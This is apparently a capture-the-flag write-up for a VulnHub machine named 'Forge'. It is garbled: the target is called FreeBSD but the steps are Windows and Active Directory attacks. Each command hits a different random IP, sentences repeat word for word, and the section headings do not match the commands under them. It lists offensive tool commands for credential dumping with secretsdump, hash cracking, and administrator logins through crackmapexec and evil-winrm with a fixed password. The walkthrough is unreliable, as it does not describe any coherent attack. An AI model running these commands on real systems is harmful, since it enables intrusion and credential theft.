---
TitleSEO: "VulnHub — Forge (Medium FreeBSD) | ZureFX"
TitlePost: "VulnHub — Forge (Medium FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Forge. SeDebugPrivilege and XSS to achieve medium compromise on FreeBSD."
Keywords: "tryhackme, offsec, pwntilldawn, linux, insane"
URL: "https://zurefx.github.io/writeups/htb-forge-801.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-forge-801/"
Date: "2024-11-26"
Tags: "TryHackMe, OffSec, PwnTillDawn, Linux, Insane"
Section: "writeups"
Lang: "en"
main_img: "htb-forge-801"
Permalink: "/writeups/htb-forge-801.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Forge** is rated **Medium** on VulnHub. It runs **FreeBSD** and the IP address during this analysis was `10.50.230.222`.

### Objectives

The application stored sensitive credentials in an unencrypted configuration file. The service account had excessive permissions assigned in Active Directory.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.52.174.195/FUZZ
crackmapexec smb 10.23.64.149 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.100.247.50/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

### Service Enumeration

The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible. Weak file permissions allowed modification of critical system files.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.113.134.47/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target.

### SMB Enumeration

The backup files contained sensitive information that should not have been accessible. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
crackmapexec smb 10.55.244.16 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.105.220.141 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.97.123.250/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The kernel version was outdated and vulnerable to a publicly known exploit. The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine.

## Exploitation

### Vulnerability Identification

Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit. The web application was vulnerable to Server-Side Template Injection (SSTI).

Key finding: **SeDebugPrivilege**.

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

### Initial Access

The backup files contained sensitive information that should not have been accessible. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.94.196.203
crackmapexec smb 10.61.245.24 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

## Privilege Escalation

### Enumeration

The service account had excessive permissions assigned in Active Directory. Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target.

```powershell
evil-winrm -i 10.41.11.90 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.119.174.233 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory.

```powershell
crackmapexec smb 10.111.242.227 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.28.195.58/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.56.167.36/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.114.201.86
```

The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file.

## Summary

### Tools Used

- `crackmapexec`
- `sharphound`
- `rpcclient`
- `hydra`
- `nikto`
- `psexec`

### Key Takeaways

- SeDebugPrivilege
- XSS
- Kerberoasting
